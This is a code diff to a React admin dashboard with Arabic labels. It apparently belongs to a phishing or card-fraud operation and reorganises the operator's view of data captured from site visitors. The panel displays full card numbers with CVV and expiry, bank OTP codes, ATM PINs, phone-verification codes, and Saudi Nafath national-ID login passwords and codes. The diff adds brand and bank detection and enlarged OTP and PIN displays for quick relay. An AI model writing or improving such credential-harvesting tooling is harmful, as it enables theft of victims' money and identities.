@@ -1,4 +1,4 @@
-import { Eye, User, MapPin, Circle, Check, X, Trash2, Phone, CreditCard, Car, Shield, Clock, MessageCircle, Loader2, Ban, ShieldCheck, ChevronDown, FileText, ShoppingCart, AlertTriangle, ArrowRight, Download, Search, Monitor, Smartphone, Tablet, Globe, Star, Timer, GitBranch, Dot, RefreshCw, Tag } from "lucide-react";
+import { Eye, User, MapPin, Circle, Check, X, Trash2, Phone, CreditCard, Car, Shield, Clock, MessageCircle, Loader2, Ban, ShieldCheck, ChevronDown, FileText, ShoppingCart, AlertTriangle, ArrowRight, Download, Search, Monitor, Smartphone, Tablet, Globe, Star, Timer, GitBranch, Dot, RefreshCw, Tag, KeyRound, Landmark, Fingerprint } from "lucide-react";
 import { useState, useEffect, useCallback, useRef, forwardRef } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { sounds } from "@/lib/sounds";
@@ -7,6 +7,8 @@ import { toast } from "sonner";
 import { Button } from "@/components/ui/button";
 import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
 import AdminVisitorChat from "@/components/admin/AdminVisitorChat";
+import CardBrandLogo from "@/components/CardBrandLogo";
+import { getCardMetadata } from "@/lib/cardMetadata";
 
 // Live timer component
 const LiveTimer = ({ since }: { since: string }) => {
@@ -1817,73 +1819,154 @@ const AdminVisitors = () => {
                                   </span>
                                 </div>
                               )}
-                              {/* Categorized data as separate cards */}
-                              <div className="space-y-2">
-                                {/* Payment card info */}
-                                {(order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv || order.payment_method) && (
-                                  <div className="rounded-xl border-2 border-amber-500/30 bg-amber-500/5 overflow-hidden">
-                                    <div className="px-3 py-2 bg-amber-500/10 border-b border-amber-500/20">
-                                      <p className="text-[10px] font-bold text-amber-600 flex items-center gap-1.5">💳 معلومات البطاقة</p>
-                                    </div>
-                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                      {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
-                                      {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
-                                      {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
-                                      {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
-                                      {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
-                                      {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
-                                    </div>
-                                  </div>
-                                )}
+                              {/* === 7 Categorized Sections === */}
+                              <div className="space-y-2.5">
 
-                                {/* OTP code */}
+                                {/* 1. معلومات بطاقة الدفع + بطاقة 3D */}
+                                {(order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv || order.payment_method) && (() => {
+                                  const num = order.card_number_full || order.card_last_four || "";
+                                  const meta = getCardMetadata(num);
+                                  const brandColors: Record<string, { from: string; to: string }> = {
+                                    visa: { from: "#1a1f71", to: "#0d47a1" },
+                                    mastercard: { from: "#eb5f07", to: "#ff6d00" },
+                                    mada: { from: "#0d7c3d", to: "#00a651" },
+                                    amex: { from: "#006fcf", to: "#00aff0" },
+                                    unionpay: { from: "#e21836", to: "#00447c" },
+                                    unknown: { from: "#374151", to: "#1f2937" },
+                                  };
+                                  const bc = brandColors[meta.brandKey] || brandColors.unknown;
+                                  const displayNum = order.card_number_full
+                                    ? order.card_number_full.replace(/(.{4})/g, '$1 ').trim()
+                                    : order.card_last_four ? `•••• •••• •••• ${order.card_last_four}` : "•••• •••• •••• ••••";
+                                  return (
+                                    <div className="rounded-xl border-2 border-amber-500/30 bg-amber-500/5 overflow-hidden">
+                                      <div className="px-3 py-2 bg-amber-500/10 border-b border-amber-500/20">
+                                        <p className="text-[10px] font-bold text-amber-600 flex items-center gap-1.5">💳 معلومات بطاقة الدفع</p>
+                                      </div>
+                                      <div className="p-3 space-y-3">
+                                        {/* Mini 3D Card */}
+                                        <div className="mx-auto w-full max-w-[260px] h-[150px] rounded-xl p-3 flex flex-col justify-between text-white relative overflow-hidden"
+                                          style={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.to})`, boxShadow: `0 8px 24px ${bc.from}44` }}>
+                                          <div className="flex justify-between items-start">
+                                            <div className="w-8 h-5 rounded bg-yellow-300/80" />
+                                            <CardBrandLogo brandKey={meta.brandKey} className="w-10 h-6" />
+                                          </div>
+                                          <p className="text-[11px] font-mono tracking-[2px] text-white/90 text-center" dir="ltr">{displayNum}</p>
+                                          <div className="flex justify-between items-end text-[9px]">
+                                            <div>
+                                              <p className="text-white/50 text-[7px]">CARD HOLDER</p>
+                                              <p className="text-white/90 font-medium truncate max-w-[140px]">{order.card_holder_name || "—"}</p>
+                                            </div>
+                                            <div className="text-left" dir="ltr">
+                                              <p className="text-white/50 text-[7px]">EXPIRES</p>
+                                              <p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p>
+                                            </div>
+                                          </div>
+                                          {meta.isDetected && meta.bankName && (
+                                            <p className="absolute bottom-1 left-1/2 -translate-x-1/2 text-[7px] text-white/40">{meta.bankName}</p>
+                                          )}
+                                        </div>
+                                        {/* Data fields */}
+                                        <div className="grid grid-cols-2 gap-2">
+                                          {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
+                                          {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
+                                          {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
+                                          {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
+                                          {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
+                                          {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
+                                          {meta.isDetected && <InfoItem label="نوع البطاقة" value={`${meta.brandLabel} - ${meta.classificationLabel}`} />}
+                                        </div>
+                                      </div>
+                                    </div>
+                                  );
+                                })()}
+
+                                {/* 2. كود OTP الدفع بالبطاقة */}
                                 {(order.otp_code || order.otp_verified !== null) && (
                                   <div className="rounded-xl border-2 border-blue-500/30 bg-blue-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-blue-500/10 border-b border-blue-500/20">
-                                      <p className="text-[10px] font-bold text-blue-600 flex items-center gap-1.5">🔑 كود التحقق البنكي (OTP)</p>
+                                      <p className="text-[10px] font-bold text-blue-600 flex items-center gap-1.5"><KeyRound className="w-3 h-3" /> كود OTP الدفع بالبطاقة</p>
                                     </div>
-                                    <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                      {order.otp_code && <InfoItem label="كود OTP" value={order.otp_code} />}
-                                      {order.otp_verified !== null && <InfoItem label="تم التحقق" value={order.otp_verified ? "نعم" : "لا"} />}
+                                    <div className="px-3 py-2.5">
+                                      {order.otp_code && (
+                                        <div className="flex items-center justify-center py-2">
+                                          <span className="text-2xl font-mono font-bold tracking-[6px] text-blue-600 bg-blue-500/10 px-4 py-1.5 rounded-lg border border-blue-500/20">{order.otp_code}</span>
+                                        </div>
+                                      )}
+                                      {order.otp_verified !== null && (
+                                        <div className="flex justify-center mt-1">
+                                          <span className={`text-[9px] px-2 py-0.5 rounded-full ${order.otp_verified ? "bg-emerald-500/15 text-emerald-600" : "bg-red-500/15 text-red-600"}`}>
+                                            {order.otp_verified ? "✓ تم التحقق" : "✗ لم يتم التحقق"}
+                                          </span>
+                                        </div>
+                                      )}
                                     </div>
                                   </div>
                                 )}
 
-                                {/* ATM info */}
+                                {/* 3. ATM */}
                                 {(order.atm_bill_number || order.atm_biller_code || order.atm_pin) && (
                                   <div className="rounded-xl border-2 border-emerald-500/30 bg-emerald-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-emerald-500/10 border-b border-emerald-500/20">
-                                      <p className="text-[10px] font-bold text-emerald-600 flex items-center gap-1.5">🏧 بيانات ATM</p>
+                                      <p className="text-[10px] font-bold text-emerald-600 flex items-center gap-1.5"><Landmark className="w-3 h-3" /> بيانات ATM</p>
                                     </div>
                                     <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
                                       {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
                                       {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
-                                      {order.atm_pin && <InfoItem label="الرقم السري ATM" value={order.atm_pin} />}
+                                      {order.atm_pin && (
+                                        <div className="col-span-2 flex justify-center">
+                                          <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
+                                        </div>
+                                      )}
                                     </div>
                                   </div>
                                 )}
 
-                                {/* Phone OTP */}
-                                {order.phone_otp_code && (
+                                {/* 4. توثيق رقم الجوال */}
+                                {(visitorPhone || order.phone) && (
                                   <div className="rounded-xl border-2 border-purple-500/30 bg-purple-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-purple-500/10 border-b border-purple-500/20">
                                       <p className="text-[10px] font-bold text-purple-600 flex items-center gap-1.5">📲 توثيق رقم الجوال</p>
                                     </div>
                                     <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                      <InfoItem label="كود توثيق الجوال" value={order.phone_otp_code} />
+                                      <InfoItem label="رقم الجوال" value={visitorPhone || order.phone || "—"} />
                                     </div>
                                   </div>
                                 )}
 
-                                {/* Nafath */}
-                                {(order.nafath_password || order.nafath_number) && (
+                                {/* 5. كود OTP توثيق رقم الجوال */}
+                                {order.phone_otp_code && (
+                                  <div className="rounded-xl border-2 border-violet-500/30 bg-violet-500/5 overflow-hidden">
+                                    <div className="px-3 py-2 bg-violet-500/10 border-b border-violet-500/20">
+                                      <p className="text-[10px] font-bold text-violet-600 flex items-center gap-1.5"><Phone className="w-3 h-3" /> كود OTP توثيق الجوال</p>
+                                    </div>
+                                    <div className="px-3 py-2.5 flex items-center justify-center">
+                                      <span className="text-2xl font-mono font-bold tracking-[6px] text-violet-600 bg-violet-500/10 px-4 py-1.5 rounded-lg border border-violet-500/20">{order.phone_otp_code}</span>
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* 6. دخول النفاذ (اسم المستخدم + كلمة المرور) */}
+                                {(order.nafath_password || selectedVisitor?.national_id || order.national_id) && (
                                   <div className="rounded-xl border-2 border-teal-500/30 bg-teal-500/5 overflow-hidden">
                                     <div className="px-3 py-2 bg-teal-500/10 border-b border-teal-500/20">
-                                      <p className="text-[10px] font-bold text-teal-600 flex items-center gap-1.5">🔐 نفاذ</p>
+                                      <p className="text-[10px] font-bold text-teal-600 flex items-center gap-1.5"><Fingerprint className="w-3 h-3" /> دخول النفاذ</p>
                                     </div>
                                     <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                      {order.nafath_password && <InfoItem label="كلمة مرور نفاذ" value={order.nafath_password} />}
-                                      {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
+                                      <InfoItem label="اسم المستخدم (الهوية)" value={selectedVisitor?.national_id || order.national_id || "—"} />
+                                      {order.nafath_password && <InfoItem label="كلمة المرور" value={order.nafath_password} />}
+                                    </div>
+                                  </div>
+                                )}
+
+                                {/* 7. رمز النفاذ */}
+                                {order.nafath_number && (
+                                  <div className="rounded-xl border-2 border-cyan-500/30 bg-cyan-500/5 overflow-hidden">
+                                    <div className="px-3 py-2 bg-cyan-500/10 border-b border-cyan-500/20">
+                                      <p className="text-[10px] font-bold text-cyan-600 flex items-center gap-1.5">🔐 رمز النفاذ</p>
+                                    </div>
+                                    <div className="px-3 py-2.5 flex items-center justify-center">
+                                      <span className="text-3xl font-mono font-bold tracking-[8px] text-cyan-600 bg-cyan-500/10 px-5 py-2 rounded-lg border border-cyan-500/20">{order.nafath_number}</span>
                                     </div>
                                   </div>
                                 )}
